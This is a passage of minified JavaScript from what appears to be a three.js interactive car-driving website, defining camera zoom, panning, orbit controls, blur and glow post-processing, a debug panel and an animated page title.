y),this.container.add(this.instance),this.sizes.on("resize",(function(){e.instance.aspect=e.sizes.viewport.width/e.sizes.viewport.height,e.instance.updateProjectionMatrix()})),this.time.on("tick",(function(){e.orbitControls.enabled||(e.targetEased.x+=(e.target.x-e.targetEased.x)*e.easing,e.targetEased.y+=(e.target.y-e.targetEased.y)*e.easing,e.targetEased.z+=(e.target.z-e.targetEased.z)*e.easing,e.instance.position.copy(e.targetEased).add(e.angle.value.clone().normalize().multiplyScalar(e.zoom.distance)),e.instance.lookAt(e.targetEased),e.instance.position.x+=e.pan.value.x,e.instance.position.y+=e.pan.value.y)}))}},{key:"setZoom",value:function(){var e=this;this.zoom={},this.zoom.easing=.1,this.zoom.minDistance=14,this.zoom.amplitude=15,this.zoom.value=this.config.cyberTruck?.3:.5,this.zoom.targetValue=this.zoom.value,this.zoom.distance=this.zoom.minDistance+this.zoom.amplitude*this.zoom.value,document.addEventListener("mousewheel",(function(t){e.zoom.targetValue+=.001*t.deltaY,e.zoom.targetValue=Math.min(Math.max(e.zoom.targetValue,0),1)}),{passive:!0}),this.zoom.touch={},this.zoom.touch.startDistance=0,this.zoom.touch.startValue=0,this.renderer.domElement.addEventListener("touchstart",(function(t){2===t.touches.length&&(e.zoom.touch.startDistance=Math.hypot(t.touches[0].clientX-t.touches[1].clientX,t.touches[0].clientX-t.touches[1].clientX),e.zoom.touch.startValue=e.zoom.targetValue)})),this.renderer.domElement.addEventListener("touchmove",(function(t){if(2===t.touches.length){t.preventDefault();var i=Math.hypot(t.touches[0].clientX-t.touches[1].clientX,t.touches[0].clientX-t.touches[1].clientX)/e.zoom.touch.startDistance;e.zoom.targetValue=e.zoom.touch.startValue-(i-1),e.zoom.targetValue=Math.min(Math.max(e.zoom.targetValue,0),1)}})),this.time.on("tick",(function(){e.zoom.value+=(e.zoom.targetValue-e.zoom.value)*e.zoom.easing,e.zoom.distance=e.zoom.minDistance+e.zoom.amplitude*e.zoom.value}))}},{key:"setPan",value:function(){var e=this;this.pan={},this.pan.enabled=!1,this.pan.active=!1,this.pan.easing=.1,this.pan.start={},this.pan.start.x=0,this.pan.start.y=0,this.pan.value={},this.pan.value.x=0,this.pan.value.y=0,this.pan.targetValue={},this.pan.targetValue.x=this.pan.value.x,this.pan.targetValue.y=this.pan.value.y,this.pan.raycaster=new Nc,this.pan.mouse=new f,this.pan.needsUpdate=!1,this.pan.hitMesh=new Lt(new si(500,500,1,1),new qe({color:16711680,wireframe:!0,visible:!1})),this.container.add(this.pan.hitMesh),this.pan.reset=function(){e.pan.targetValue.x=0,e.pan.targetValue.y=0},this.pan.enable=function(){e.pan.enabled=!0,e.renderer.domElement.classList.add("has-cursor-grab")},this.pan.disable=function(){e.pan.enabled=!1,e.renderer.domElement.classList.remove("has-cursor-grab")},this.pan.down=function(t,i){if(e.pan.enabled){e.renderer.domElement.classList.add("has-cursor-grabbing"),e.pan.active=!0,e.pan.mouse.x=t/e.sizes.viewport.width*2-1,e.pan.mouse.y=-i/e.sizes.viewport.height*2+1,e.pan.raycaster.setFromCamera(e.pan.mouse,e.instance);var n=e.pan.raycaster.intersectObjects([e.pan.hitMesh]);n.length&&(e.pan.start.x=n[0].point.x,e.pan.start.y=n[0].point.y)}},this.pan.move=function(t,i){e.pan.enabled&&e.pan.active&&(e.pan.mouse.x=t/e.sizes.viewport.width*2-1,e.pan.mouse.y=-i/e.sizes.viewport.height*2+1,e.pan.needsUpdate=!0)},this.pan.up=function(){e.pan.active=!1,e.renderer.domElement.classList.remove("has-cursor-grabbing")},window.addEventListener("mousedown",(function(t){e.pan.down(t.clientX,t.clientY)})),window.addEventListener("mousemove",(function(t){e.pan.move(t.clientX,t.clientY)})),window.addEventListener("mouseup",(function(){e.pan.up()})),this.renderer.domElement.addEventListener("touchstart",(function(t){1===t.touches.length&&e.pan.down(t.touches[0].clientX,t.touches[0].clientY)})),this.renderer.domElement.addEventListener("touchmove",(function(t){1===t.touches.length&&e.pan.move(t.touches[0].clientX,t.touches[0].clientY)})),this.renderer.domElement.addEventListener("touchend",(function(){e.pan.up()})),this.time.on("tick",(function(){if(e.pan.active&&e.pan.needsUpdate){e.pan.raycaster.setFromCamera(e.pan.mouse,e.instance);var t=e.pan.raycaster.intersectObjects([e.pan.hitMesh]);t.length&&(e.pan.targetValue.x=-(t[0].point.x-e.pan.start.x),e.pan.targetValue.y=-(t[0].point.y-e.pan.start.y)),e.pan.needsUpdate=!1}e.pan.value.x+=(e.pan.targetValue.x-e.pan.value.x)*e.pan.easing,e.pan.value.y+=(e.pan.targetValue.y-e.pan.value.y)*e.pan.easing}))}},{key:"setOrbitControls",value:function(){this.orbitControls=new dg(this.instance,this.renderer.domElement),this.orbitControls.enabled=!1,this.orbitControls.enableKeys=!1,this.orbitControls.zoomSpeed=.5,this.debug&&this.debugFolder.add(this.orbitControls,"enabled").name("orbitControlsEnabled")}}])&&vg(t.prototype,i),n&&vg(t,n),e}();function yg(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var bg=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.$canvas=t.$canvas,this.time=new ru,this.sizes=new Jh,this.resources=new tg,this.setConfig(),this.setDebug(),this.setRenderer(),this.setCamera(),this.setPasses(),this.setWorld(),this.setTitle()}var t,i,n;return t=e,(i=[{key:"setConfig",value:function(){var e=this;this.config={},this.config.debug="#debug"===window.location.hash,this.config.cyberTruck="#cybertruck"===window.location.hash,this.config.touch=!1,window.addEventListener("touchstart",(function(){e.config.touch=!0,e.world.controls.setTouch(),e.passes.horizontalBlurPass.strength=1,e.passes.horizontalBlurPass.material.uniforms.uStrength.value=new f(e.passes.horizontalBlurPass.strength,0),e.passes.verticalBlurPass.strength=1,e.passes.verticalBlurPass.material.uniforms.uStrength.value=new f(0,e.passes.verticalBlurPass.strength)}),{once:!0})}},{key:"setDebug",value:function(){this.config.debug&&(this.debug=new Gh({width:420}))}},{key:"setRenderer",value:function(){var e=this;this.scene=new ee,this.renderer=new hr({canvas:this.$canvas,alpha:!0}),this.renderer.setClearColor(0,1),this.renderer.setPixelRatio(2),this.renderer.setSize(this.sizes.viewport.width,this.sizes.viewport.height),this.renderer.physicallyCorrectLights=!0,this.renderer.gammaFactor=2.2,this.renderer.gammaOutPut=!0,this.renderer.autoClear=!1,this.sizes.on("resize",(function(){e.renderer.setSize(e.sizes.viewport.width,e.sizes.viewport.height)}))}},{key:"setCamera",value:function(){var e=this;this.camera=new gg({time:this.time,sizes:this.sizes,renderer:this.renderer,debug:this.debug,config:this.config}),this.scene.add(this.camera.container),this.time.on("tick",(function(){e.world&&e.world.car&&(e.camera.target.x=e.world.car.chassis.object.position.x,e.camera.target.y=e.world.car.chassis.object.position.y)}))}},{key:"setPasses",value:function(){var e=this;if(this.passes={},this.debug&&(this.passes.debugFolder=this.debug.addFolder("postprocess")),this.passes.composer=new sg(this.renderer),this.passes.renderPass=new lg(this.scene,this.camera.instance),this.passes.horizontalBlurPass=new rg(hg),this.passes.horizontalBlurPass.strength=this.config.touch?0:1,this.passes.horizontalBlurPass.material.uniforms.uResolution.value=new f(this.sizes.viewport.width,this.sizes.viewport.height),this.passes.horizontalBlurPass.material.uniforms.uStrength.value=new f(this.passes.horizontalBlurPass.strength,0),this.passes.verticalBlurPass=new rg(hg),this.passes.verticalBlurPass.strength=this.config.touch?0:1,this.passes.verticalBlurPass.material.uniforms.uResolution.value=new f(this.sizes.viewport.width,this.sizes.viewport.height),this.passes.verticalBlurPass.material.uniforms.uStrength.value=new f(0,this.passes.verticalBlurPass.strength),this.debug){var t=this.passes.debugFolder.addFolder("blur");t.open(),t.add(this.passes.horizontalBlurPass.material.uniforms.uStrength.value,"x").step(.001).min(0).max(10),t.add(this.passes.verticalBlurPass.material.uniforms.uStrength.value,"y").step(.001).min(0).max(10)}if(this.passes.glowsPass=new rg(ug),this.passes.glowsPass.color="#ffcfe0",this.passes.glowsPass.material.uniforms.uPosition.value=new f(0,.25),this.passes.glowsPass.material.uniforms.uRadius.value=.7,this.passes.glowsPass.material.uniforms.uColor.value=new Ne(this.passes.glowsPass.color),this.passes.glowsPass.material.uniforms.uAlpha.value=.55,this.debug){var i=this.passes.debugFolder.addFolder("glows");i.open(),i.add(this.passes.glowsPass.material.uniforms.uPosition.value,"x").step(.001).min(-1).max(2).name("positionX"),i.add(this.passes.glowsPass.material.uniforms.uPosition.value,"y").step(.001).min(-1).max(2).name("positionY"),i.add(this.passes.glowsPass.material.uniforms.uRadius,"value").step(.001).min(0).max(2).name("radius"),i.addColor(this.passes.glowsPass,"color").name("color").onChange((function(){e.passes.glowsPass.material.uniforms.uColor.value=new Ne(e.passes.glowsPass.color)})),i.add(this.passes.glowsPass.material.uniforms.uAlpha,"value").step(.001).min(0).max(1).name("alpha")}this.passes.composer.addPass(this.passes.renderPass),this.passes.composer.addPass(this.passes.horizontalBlurPass),this.passes.composer.addPass(this.passes.verticalBlurPass),this.passes.composer.addPass(this.passes.glowsPass),this.time.on("tick",(function(){e.passes.horizontalBlurPass.enabled=e.passes.horizontalBlurPass.material.uniforms.uStrength.value.x>0,e.passes.verticalBlurPass.enabled=e.passes.verticalBlurPass.material.uniforms.uStrength.value.y>0,e.passes.composer.render()})),this.sizes.on("resize",(function(){e.renderer.setSize(e.sizes.viewport.width,e.sizes.viewport.height),e.passes.composer.setSize(e.sizes.viewport.width,e.sizes.viewport.height),e.passes.horizontalBlurPass.material.uniforms.uResolution.value.x=e.sizes.viewport.width,e.passes.horizontalBlurPass.material.uniforms.uResolution.value.y=e.sizes.viewport.height,e.passes.verticalBlurPass.material.uniforms.uResolution.value.x=e.sizes.viewport.width,e.passes.verticalBlurPass.material.uniforms.uResolution.value.y=e.sizes.viewport.height}))}},{key:"setWorld",value:function(){this.world=new Up({config:this.config,debug:this.debug,resources:this.resources,time:this.time,sizes:this.sizes,camera:this.camera,renderer:this.renderer,passes:this.passes}),this.scene.add(this.world.container)}},{key:"setTitle",value:function(){var e=this;this.title={},this.title.frequency=300,this.title.width=20,this.title.position=0,this.title.$element=document.querySelector("title"),this.title.absolutePosition=Math.round(.25*this.title.width),this.time.on("tick",(function(){e.world.physics&&(e.title.absolutePosition+=e.world.physics.car.forwardSpeed,e.title.absolutePosition<0&&(e.title.absolutePosition=0))})),window.setInterval((function(){e.title.position=Math.round(e.title.absolutePosition%e.title.width),document.title="".concat("_".repeat(e.title.width-e.title.position),"🚗").concat("_".repeat(e.title.position))}),this.title.frequency)}},{key:"destructor",value:function(){this.time.off("tick"),this.sizes.off("resize"),this.camera.orbitControls.dispose(),this.renderer.dispose(),this.debug.destroy()}}])&&yg(t.prototype,i),n&&yg(t,n),e}();window.application=new bg({$canvas:document.querySelector(".js-canvas"),useComposer:!0})}])});